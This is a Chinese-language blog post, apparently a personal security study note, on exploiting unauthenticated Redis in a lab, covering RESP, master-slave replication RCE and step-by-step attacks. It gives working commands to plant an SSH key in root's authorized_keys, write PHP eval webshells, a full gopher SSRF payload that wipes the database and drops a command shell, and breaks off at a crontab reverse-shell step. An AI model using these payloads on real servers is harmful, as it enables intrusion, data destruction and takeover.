@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="m0nk3y">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="m0nk3y">
+    
+    <meta name="keywords" content="信息安全,CTF,攻防对抗,代码审计,安全研究,渗透测试">
+    
+    <meta name="description" content="">
+    <meta name="description" content="最近放出来的文章都是以前早就总结好的了。 Redis 安全学习笔记 [TOC] 实战环境下，感觉Redis 未授权非常常见，而我之前只知道怎么利用别人的写好的工具去解CTF，没有去研究过原理，遂在端午节来研究一波！ Redis 介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis 安全学习笔记">
+<meta property="og:url" content="https://hack-for.fun/c10c5ca9.html">
+<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:description" content="最近放出来的文章都是以前早就总结好的了。 Redis 安全学习笔记 [TOC] 实战环境下，感觉Redis 未授权非常常见，而我之前只知道怎么利用别人的写好的工具去解CTF，没有去研究过原理，遂在端午节来研究一波！ Redis 介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ/badge">
+<meta property="og:image" content="https://i.imgur.com/p9JFoqk.png">
+<meta property="og:image" content="https://i.imgur.com/2VYBQlt.png">
+<meta property="og:image" content="https://i.imgur.com/OiedL9z.png">
+<meta property="og:image" content="https://i.imgur.com/LVfNqbh.png">
+<meta property="og:image" content="https://i.imgur.com/Ks7zBDv.png">
+<meta property="og:image" content="https://i.imgur.com/V8qwFVy.png">
+<meta property="og:image" content="https://i.imgur.com/o04V2rM.png">
+<meta property="og:image" content="https://i.imgur.com/NQONHXo.png">
+<meta property="og:image" content="https://i.imgur.com/tCHcAkz.png">
+<meta property="og:image" content="https://i.imgur.com/qApD7Ir.png">
+<meta property="og:image" content="https://i.imgur.com/UDjp6GH.png">
+<meta property="og:image" content="https://i.imgur.com/P5uZdwM.png">
+<meta property="og:image" content="https://i.imgur.com/cLoUGX3.png">
+<meta property="og:image" content="https://i.imgur.com/SeNIJDt.jpg">
+<meta property="og:image" content="https://i.imgur.com/rUwcW6f.png">
+<meta property="og:image" content="https://i.imgur.com/lWGmVLx.png">
+<meta property="og:image" content="https://i.imgur.com/je6ovIe.png">
+<meta property="og:image" content="https://i.imgur.com/VW73I1v.png">
+<meta property="og:image" content="https://i.imgur.com/KRBRvS9.png">
+<meta property="og:image" content="https://i.imgur.com/39WhmIK.png">
+<meta property="og:image" content="https://i.imgur.com/HMYcnTZ.png">
+<meta property="og:image" content="https://i.imgur.com/A41ZMox.png">
+<meta property="og:image" content="https://i.imgur.com/U6Z4tkr.png">
+<meta property="og:image" content="https://i.imgur.com/UANrinf.png">
+<meta property="og:image" content="https://i.imgur.com/n9gYmuj.png">
+<meta property="og:image" content="https://i.imgur.com/ydL4RPh.png">
+<meta property="og:image" content="https://i.imgur.com/AxEyXv7.png">
+<meta property="og:image" content="https://i.imgur.com/guAkaO1.png">
+<meta property="og:image" content="https://i.imgur.com/BhlKVPY.png">
+<meta property="og:image" content="https://i.imgur.com/QDxyT31.png">
+<meta property="og:image" content="https://i.imgur.com/TY3qpOp.png">
+<meta property="og:image" content="https://i.imgur.com/ugzwH85.png">
+<meta property="og:image" content="https://i.imgur.com/ZY8Ae2n.png">
+<meta property="og:image" content="https://i.imgur.com/VV6WV5W.png">
+<meta property="article:published_time" content="2020-08-26T01:58:53.000Z">
+<meta property="article:modified_time" content="2020-08-26T02:09:09.598Z">
+<meta property="article:author" content="m0nk3y">
+<meta property="article:tag" content="Redis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ/badge">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>Redis 安全学习笔记 · m0nk3y&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825203605.JPG" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >沉下心来搞技术！</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Redis 安全学习笔记</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>沉下心来搞技术！</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Redis 安全学习笔记
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Redis">Redis</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">8.2k</span>Reading time: <span class="post-count reading-time">34 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/08/26</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>最近放出来的文章都是以前早就总结好的了。</p>
+<h1 id="Redis-安全学习笔记"><a href="#Redis-安全学习笔记" class="headerlink" title="Redis 安全学习笔记"></a>Redis 安全学习笔记</h1><p><a target="_blank" rel="noopener" href="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ"><img src="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ/badge" alt="hackmd-github-sync-badge"></a></p>
+<p>[TOC]</p>
+<p>实战环境下，感觉Redis 未授权非常常见，而我之前只知道怎么利用别人的写好的工具去解CTF，没有去研究过原理，遂在端午节来研究一波！</p>
+<h2 id="Redis-介绍"><a href="#Redis-介绍" class="headerlink" title="Redis 介绍"></a>Redis 介绍</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p>
+<blockquote>
+<p>Redis 下载地址：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/">http://download.redis.io/releases/</a></p>
+</blockquote>
+<h2 id="RESP-协议介绍"><a href="#RESP-协议介绍" class="headerlink" title="RESP 协议介绍"></a>RESP 协议介绍</h2><p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。<br>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。<br>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
+<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
+<p>客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。<br>服务器根据命令实现回复一种RESP类型。<br>在RESP中，某些数据的类型取决于第一个字节：<br>对于Simple Strings，回复的第一个字节是+<br>对于error，回复的第一个字节是-<br>对于Integer，回复的第一个字节是:<br>对于Bulk Strings，回复的第一个字节是$<br>对于array，回复的第一个字节是*<br>此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。<br>在RESP中，协议的不同部分始终以”\r\n”(CRLF)结束。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><h3 id="未授权漏洞"><a href="#未授权漏洞" class="headerlink" title="未授权漏洞"></a>未授权漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下（默认配置），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+<p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。　　目前比较主流的案例：yam2 minerd 挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。</p>
+<p>简单说，漏洞的产生条件有以下两点：</p>
+<p>（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；</p>
+<p>（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p>
+<p>(3) root 身份运行redis</p>
+<p>主流案例图示<br>主流案例图示</p>
+<p>写公钥只是其中一种，还可以写webshell ，crontab 反弹shell，来getshell。<br><img src="https://i.imgur.com/p9JFoqk.png"></p>
+<p>以及其他漏洞场景，下面逐一介绍和复现。</p>
+<h3 id="主从复制-RCE"><a href="#主从复制-RCE" class="headerlink" title="主从复制 RCE"></a>主从复制 RCE</h3><p>Redis主从复制介绍<br>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>漏洞出现的背景<br>随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了</p>
+<p>漏洞原理<br>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。</p>
+<p>然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h3><p>安装Redis</p>
+<p>sudo apt-get update # 更新apt 包<br>sudo apt-get install redis-server # 安装Redis<br>service redis-server start # 开启Redis 服务（ 经过复现，这种模式下，是以redis身份运行的redis 服务<br>redis-cli # 进入Redis 命令行模式</p>
+<p>复现环境<br><img src="https://i.imgur.com/2VYBQlt.png"></p>
+<p>网络环境：NAT</p>
+<p>攻击机：Kali Linux：192.168.118.129</p>
+<p>靶机：Ubuntu 18.04 ：192.168.118.142</p>
+<p>Redis 连接命令<br>redis-cli -h 127.0.0.1 -p 6379<br>解决Redis 无法远程连接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a></p>
+<p>修改redis 配置文件: Ubuntu 在 /etc/redis/redis.conf</p>
+<p>#bind 127.0.0.1<br>redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379。</p>
+<p>Protected-mode no<br>redis3.2版本后新增protected-mode配置，默认是yes，即开启。设置外部网络连接redis服务，设置方式如下：<br>1、关闭protected-mode模式，此时外部网络可以直接访问<br>2、开启protected-mode保护模式，需配置bind ip或者设置访问密码</p>
+<h3 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h3><p>对靶机进行全端口扫描：<br><img src="https://i.imgur.com/OiedL9z.png"></p>
+<p>发现对外开启6379 redis 服务。获取redis 详细信息</p>
+<p>nmap -A -p 6379 -script redis-info 192.168.118.142<br><img src="https://i.imgur.com/LVfNqbh.png"></p>
+<p>尝试远程连接受害者redis 服务。</p>
+<p>redis-cli -h 192.168.118.142 -p 6379</p>
+<p>成功连上，执行命令ping , 如果回显PONG 则表示远程登录成功。</p>
+<p>执行info 命令，在redis 2.8 以后可以看到redis 配置文件的物理路径：<br><img src="https://i.imgur.com/Ks7zBDv.png"></p>
+<p>Ubuntu 下为：/etc/redis/redis.conf</p>
+<p>CentOs 下为：/etc/redis.conf</p>
+<p>场景一：利用redis 写入ssh key 远程登录靶机ssh<br>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p>
+<p>条件：</p>
+<p>靶机以root 身份启动redis 服务<br>redis 认证无密码或者弱口令<br>服务器开启ssh服务，并允许以密钥登录 ，开启ssh 服务：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jackghq/article/details/54974141">https://blog.csdn.net/jackghq/article/details/54974141</a><br>攻击机：</p>
+<p>生成ssh key<br>ssh-keygen -t rsa<br><img src="https://i.imgur.com/V8qwFVy.png"></p>
+<p>这里使用\n\n 前后换行，是为了避免和redis 其他缓存的数据混淆。</p>
+<p>将生成的key.txt 写入靶机的缓冲里<br>cat /root/.ssh/key.txt | redis-cli -h 192.168.118.142 -x set evil_ssh_key</p>
+<p>这里出现报错，不知道是不是版本问题还是执行的命令有问题，Google 解决：</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3aaf21dd34d6">https://www.jianshu.com/p/3aaf21dd34d6</a></p>
+<p>原因：强制关闭redis 快照导致不能持久化。</p>
+<p>在靶机上redis 执行（所以我感觉这次复现算是失败了，实际环境怎么可能呢，</p>
+<p>127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no<br>当我正准备写的时候，发现permission denied。原因：靶机redis 不是以root 身份运行，说不定上一个报错，同样也是这个原因。</p>
+<p>将permission deied的问题去搜索。发现已有人踩过坑。</p>
+<p><a target="_blank" rel="noopener" href="https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/">https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/</a></p>
+<p><img src="https://i.imgur.com/o04V2rM.png"></p>
+<p>果然，查看进程发现，redis 不是以root 身份登录的。而且上面那个修改为no，只是不报错，问题其实也并没有解决。这里通过以root权限使用配置文件启动redis-server 即可。（原因是高版本redis，默认以redis 身份运行的</p>
+<ol>
+<li>设置redis 备份路径为/root/.ssh , 这样可以写入我们的evil_ssh_key<br>config set dir /root/.ssh   # 如果报错，说明靶机没有登录过ssh。执行 ssh localhost 即可</li>
+<li>设置保存文件名为 authorized_keys<br>config set dbfilename authorized_keys</li>
+<li>保存，数据写入dir 目录下的 dbfilename 中<br>save</li>
+<li>ssh 连接即可getshell<br>dir: The DB will be written inside this directory, with the filename specified above using the ‘dbfilename’ configuration directive.<br>dbfilename: The filename where to dump the DB</li>
+</ol>
+<p>/etc/redis/redis.conf</p>
+<p><img src="https://i.imgur.com/NQONHXo.png"></p>
+<p>方法二：生成符合RESP 格式的payload ，利用 ssrf(gopher 协议) + curl 打。<br>这里不做复现。</p>
+<h4 id="场景二：利用redis-写入webshell"><a href="#场景二：利用redis-写入webshell" class="headerlink" title="场景二：利用redis 写入webshell"></a>场景二：利用redis 写入webshell</h4><p>直接写 webshell<br>192.168.118.142:6379&gt; config set dir /var/www/html<br>OK<br>192.168.118.142:6379&gt; set xxx “\n\n\n<?php @eval($_POST[a];?>\n\n\n”<br>OK<br>192.168.118.142:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.142:6379&gt; save<br>OK<br>192.168.118.142:6379&gt;<br>使用蚁剑发现无法连接。不过在靶机上确实可以看到文件写入了。</p>
+<p>解决Apache 不解析 php ：sudo apt-get install libapache2-mod-php7.2<br><img src="https://i.imgur.com/tCHcAkz.png"></p>
+<p>直接访问，返回500。可以看到文件内容有点奇怪。试试flushall全部删掉，重新写webshell 。果然，成功连接webshell。</p>
+<p>FLUSHALL命令可以清空一个Redis实例中所有数据库中的数据</p>
+<p>192.168.118.142:6379&gt; flushall<br>OK<br>192.168.118.142:6379&gt; config get dir</p>
+<ol>
+<li>“dir”</li>
+<li>“/var/www/html”</li>
+<li>168.118.142:6379&gt; config set dir /var/www/html/<br>OK</li>
+<li>168.118.142:6379&gt; config get dbfilename</li>
+<li>“dbfilename”</li>
+<li>“webshell.php”</li>
+<li>168.118.142:6379&gt; config set dbfilename shell.php<br>OK</li>
+<li>168.118.142:6379&gt; set webshell “<?php eval($_POST[a]);?>“<br>OK</li>
+<li>168.118.142:6379&gt; save<br>OK</li>
+<li>168.118.142:6379&gt; </li>
+</ol>
+<p><img src="https://i.imgur.com/qApD7Ir.png"></p>
+<p>这个成功连上去，是www-data权限。所以没有ssh 直接是root权限（因为ssh利用方式，是root启动redis，root登录ssh。不过问题不大，拿到webshell 了，至少渗透也就成功了一半了。</p>
+<p>不过真实渗透不可能让你执行flushall的，数据最重要。</p>
+<p>SSRF 写入 WebShell<br>curl + 下面的payload</p>
+<p>gopher://192.168.118.142:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br><img src="https://i.imgur.com/UDjp6GH.png"></p>
+<h4 id="场景三：利用redis-写入crontab-反弹shell"><a href="#场景三：利用redis-写入crontab-反弹shell" class="headerlink" title="场景三：利用redis 写入crontab 反弹shell"></a>场景三：利用redis 写入crontab 反弹shell</h4><p>看网上已经复现的师傅的文章，ubuntu 利用定时任务反弹shell 几乎不成，利用python 反弹有时候可以成功。CentOS 可以成功。<br><img src="https://i.imgur.com/P5uZdwM.png"></p>
+<p>这里就用yulige 文章中的版本：CentOS 6.7</p>
+<p>原理也是利用 未授权通过 CONFIG 和 set 等命令来写定时任务，简单的换了一下物理路径(根据OS的不同，定时任务的文件目录不同)。然后当靶机执行定时任务时，即可反弹shell。</p>
+<p>CentOS 定时任务：/var/spool/cron/<username></p>
+<p>Ubuntu 定时任务：/var/spool/cron/crontabs/<username></p>
+<p>bash 反弹<br>Payload:</p>
+<p>payload经过url 编码后，在存在SSRF的漏洞点即可反弹shell。</p>
